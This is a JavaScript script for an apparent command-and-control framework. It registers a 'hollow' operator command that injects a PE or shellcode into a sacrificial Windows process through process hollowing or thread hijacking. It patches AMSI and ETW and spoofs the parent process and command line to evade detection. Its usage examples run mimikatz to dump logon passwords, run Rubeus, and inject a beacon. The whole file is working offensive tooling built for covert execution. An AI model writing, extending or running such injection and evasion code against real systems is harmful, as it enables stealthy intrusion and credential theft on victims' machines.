var cmd_hollow = ax.create_command(
    "hollow",
    "Process hollowing (PE) or shellcode injection into a sacrificial process.\n" +
    "  PE mode:  NtUnmapViewOfSection + import resolution + relocations + AMSI/ETW patch.\n" +
    "  SC mode:  VirtualAllocEx + thread hijack + ETW patch.\n" +
    "  Both:     PPID spoof, BlockDLLs, command-line spoof, output capture.\n" +
    "  Note:     Native x64 PEs only. For .NET PEs use execute-assembly.",
    'hollow --pe /opt/Rubeus.exe -a "triage" --timeout 120\n' +
    'hollow --pe /opt/mimikatz.exe -a "privilege::debug sekurlsa::logonpasswords"\n' +
    'hollow --sc /opt/beacon.bin -no --spawnto C:\\Windows\\System32\\RuntimeBroker.exe\n' +
    'hollow --local-pe C:\\Windows\\Temp\\tool.exe -a "/all" --async'
);

cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "PE file from operator (Kali). Mutually exclusive with --sc, --local-pe, --local-sc");
cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode file from operator. Mutually exclusive with --pe, --local-pe, --local-sc");
cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH", false, "PE on target (local path or UNC)");
cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",   false, "Shellcode on target (local path)");
cmd_hollow.addArgFlagString("-a",          "ARGS",      false, "Arguments passed to the PE (ignored for shellcode)");
cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",  false, "Sacrificial process (default: svchost.exe)");
cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",   false, "Output capture timeout in seconds (default: 60)");
cmd_hollow.addArgBool("-no",                                    "Fire and forget — no output capture");
cmd_hollow.addArgBool("--no-blockdlls",                         "Disable BlockDLLs (allow non-MS DLLs in child)");
cmd_hollow.addArgBool("--no-ppid",                              "Disable PPID spoofing");
cmd_hollow.addArgBool("--async",                                "Run BOF asynchronously (returns immediately)");

cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.is64(id) == false) { throw new Error("Only x64 targets supported"); }

    let hasPE       = "PE_FILE" in parsed_json;
    let hasSC       = "SC_FILE" in parsed_json;
    let hasLocalPE  = "WIN_PATH" in parsed_json;
    let hasLocalSC  = "WIN_SC" in parsed_json;

    let inputCount = (hasPE ? 1 : 0) + (hasSC ? 1 : 0) + (hasLocalPE ? 1 : 0) + (hasLocalSC ? 1 : 0);
    if (inputCount === 0) throw new Error("Provide one of: --pe, --sc, --local-pe, --local-sc");
    if (inputCount > 1)   throw new Error("Only one input source allowed (--pe, --sc, --local-pe, or --local-sc)");

    let mode = 0;       // 0=PE, 1=shellcode
    let source = 0;     // 0=bytes from operator, 1=path on target
    let payloadBytes = "";
    let localPath = "";

    if (hasPE) {
        mode = 0; source = 0;
        payloadBytes = parsed_json["PE_FILE"];
        if (payloadBytes.byteLength == 0) throw new Error("PE file is empty or unreadable");
    } else if (hasSC) {
        mode = 1; source = 0;
        payloadBytes = parsed_json["SC_FILE"];
        if (payloadBytes.byteLength == 0) throw new Error("Shellcode file is empty or unreadable");
    } else if (hasLocalPE) {
        mode = 0; source = 1;
        localPath = parsed_json["WIN_PATH"];
    } else if (hasLocalSC) {
        mode = 1; source = 1;
        localPath = parsed_json["WIN_SC"];
    }

    let noOutput = parsed_json["-no"] ? 1 : 0;
    let timeout  = ("SECONDS" in parsed_json) ? parsed_json["SECONDS"] * 1000 : 60000;
    let blockDlls = parsed_json["--no-blockdlls"] ? 0 : 1;
    let noPpid   = parsed_json["--no-ppid"] ? 1 : 0;
    let spawnto  = ("SPAWN_TO" in parsed_json) ? parsed_json["SPAWN_TO"] : "";
    let args     = ("ARGS" in parsed_json) ? parsed_json["ARGS"] : "";
    let async    = parsed_json["--async"] ? "-a " : "";

    let bof_params = ax.bof_pack(
        "int,int,int,int,int,int,cstr,cstr,cstr,bytes",
        [mode, source, noOutput, timeout, blockDlls, noPpid, spawnto, args, localPath, payloadBytes]
    );

    let bof_path = ax.script_dir() + "_bin/hollow." + ax.arch(id) + ".o";

    let label = mode === 0 ? "PE" : "shellcode";
    let srcLabel = source === 0 ? "operator" : "target";
    let message = `Task: ${label} hollow (${srcLabel}) → ${spawnto || "svchost.exe"}`;

    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, message);
});
